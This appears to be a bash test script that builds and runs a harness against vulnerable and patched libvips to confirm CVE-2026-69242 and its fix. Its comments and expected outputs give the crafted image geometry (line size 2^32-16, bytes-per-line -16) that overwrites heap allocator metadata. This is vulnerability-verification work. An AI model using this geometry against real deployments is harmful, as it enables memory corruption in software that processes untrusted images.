#!/usr/bin/env bash
# Reproduce the W16 fine-grained negative-bpl controls for CVE-2026-69242.
# Requires the pinned plain vulnerable/fixed builds (cfg-vuln-plain.log,
# cfg-fixed-plain.log) prepared by the usual meson/ninja runs.
set -u
cd "$(dirname "$0")" || exit 1

ROOT=$(cd .. && pwd)
VULN_LIB="$ROOT/build-vuln-plain/libvips"
FIXED_LIB="$ROOT/build-fixed-plain/libvips"
for d in "$VULN_LIB" "$FIXED_LIB"; do
	if [ ! -f "$d/libvips.so.42" ]; then
		echo "MISSING BUILD: $d" >&2
		exit 2
	fi
done

INC="$(pkg-config --cflags glib-2.0 gobject-2.0) -I$ROOT/src/libvips-8.18.2/libvips/include"
LIB=$(pkg-config --libs glib-2.0 gobject-2.0)
CFLAGS="-g -O0 -DHAVE_CONFIG_H"

gcc $CFLAGS -I"$ROOT/build-vuln-plain" -I"$ROOT/build-vuln-plain/libvips/include" \
	$INC -o fine-vuln fine.c -L"$VULN_LIB" -lvips $LIB || exit 1
gcc $CFLAGS -I"$ROOT/build-fixed-plain" -I"$ROOT/build-fixed-plain/libvips/include" \
	-I"$ROOT/src/libvips-fixed/libvips/include" $INC -o fine-fixed fine.c \
	-L"$FIXED_LIB" -lvips $LIB || exit 1

run() {
	local lib=$1 bin=$2 out=$3 mode=$4
	LD_LIBRARY_PATH="$lib" timeout 90 "./$bin" "$mode" >"$out" 2>&1
	local rc=$?
	printf 'RUN_RC=%d\n' "$rc" >>"$out"
}

run "$VULN_LIB" fine-vuln fine-vuln-craft.out craft
run "$FIXED_LIB" fine-fixed fine-fixed-craft.out craft
run "$VULN_LIB" fine-vuln fine-vuln-safe.out safe

fail=0
check() {
	if grep -qF "$2" "$1"; then
		echo "PASS $1 :: $2"
	else
		echo "FAIL $1 :: $2"
		fail=1
	fi
}
absent() {
	if grep -qF "$2" "$1"; then
		echo "FAIL $1 :: must not contain $2"
		fail=1
	else
		echo "PASS $1 :: absent $2"
	fi
}

# Vulnerable + fine craft: ls=2^32-16, bpl=-16, write reaches the live
# vips_tracked_malloc size field at data-16 without an unmapped fault.
check fine-vuln-craft.out 'sizeof_line=4294967280 sizeof_image=8589934560'
check fine-vuln-craft.out 'bpl=-16 lskip=18446744073709551600'
check fine-vuln-craft.out 'PAINT_DONE'
check fine-vuln-craft.out 'TRACKED_SIZE_AFTER=0x4141414141414141'
check fine-vuln-craft.out '  -16: 41 41 41 41 41 41 41 41'
check fine-vuln-craft.out 'RUN_RC=0'
check fine-vuln-craft.out 'vips_free: too much free'
check fine-vuln-craft.out 'memory: 0 allocations, -4702111225885049169 bytes'
absent fine-vuln-safe.out 'vips_free: too much free'
absent fine-fixed-craft.out 'vips_free: too much free'

# Fixed tree rejects the geometry before a region or paint exists.
check fine-fixed-craft.out 'IMAGE=ERR msg=image: dimension overflow'
absent fine-fixed-craft.out 'PAINT_DONE'
absent fine-fixed-craft.out 'TRACKED_SIZE_AFTER'
check fine-fixed-craft.out 'RUN_RC=0'

# Safe geometry keeps a positive bpl; tracked size is untouched.
check fine-vuln-safe.out 'sizeof_line=3072 sizeof_image=6144'
check fine-vuln-safe.out 'bpl=3072'
check fine-vuln-safe.out 'PAINT_DONE'
absent fine-vuln-safe.out 'TRACKED_SIZE_AFTER=0x4141414141414141'
check fine-vuln-safe.out 'RUN_RC=0'

echo "RESULT fail=$fail"
exit "$fail"
